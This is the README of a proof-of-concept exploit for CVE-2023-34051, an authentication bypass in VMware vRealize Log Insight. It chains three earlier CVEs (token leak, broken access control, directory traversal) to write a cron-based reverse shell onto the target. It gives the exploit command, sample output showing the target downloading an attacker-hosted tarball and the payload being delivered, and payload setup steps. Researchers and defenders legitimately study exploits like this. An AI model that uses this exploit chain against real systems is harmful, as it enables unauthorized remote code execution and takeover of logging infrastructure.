# CVE-2023-34051 
CVE-2023-34051 is an authentication bypass that bypasses the patch for VMSA-2023-0001.
VMSA-2023-0001 for vRealize Log Insight includes the following CVEs:
* VMware vRealize Log Insight Directory Traversal Vulnerability (CVE-2022-31706)
* VMware vRealize Log Insight broken access control Vulnerability (CVE-2022-31704)
* VMware vRealize Log Insight contains an Information Disclosure Vulnerability (CVE-2022-31711)

The default configuration of this vulnerability writes a cron job to create a
reverse shell. Be sure to change the `payload` file to suit your environment.

## Summary
This POC abuses IP address spoofing and various Thrift RPC endpoints to achieve an arbitrary file write.

## Usage
```plaintext
$ python3 VMSA-2023-0001.py --target_address 192.168.4.133 --http_server_address 192.168.4.60 --http_server_port 8080 --payload_file payload --payload_path /etc/cron.d/exploit 
[+] Using CVE-2022-31711 to leak node token
[+] Found node token: f261d2f5-71fa-45fd-a0a0-6114a55a8fb8
[+] Using CVE-2022-31704 to trigger malicious file download
192.168.4.133 - - [30/Jan/2023 16:43:41] "GET /exploit.tar HTTP/1.1" 200 -
[+] File successfully downloaded
[+] Using CVE-2022-31706 to trigger directory traversal and write cron reverse shell
[+] Payload successfully delivered
```

## Troubleshooting
For this attack to work, an attacker must have the same IP address as a master /worker node. See blog above for more details.

If using a cron based payload, make sure the payload file has the appropriate
permissions and owner:
```shell
sudo chown root:root payload
```
```shell
sudo chmod 0644 payload 
```
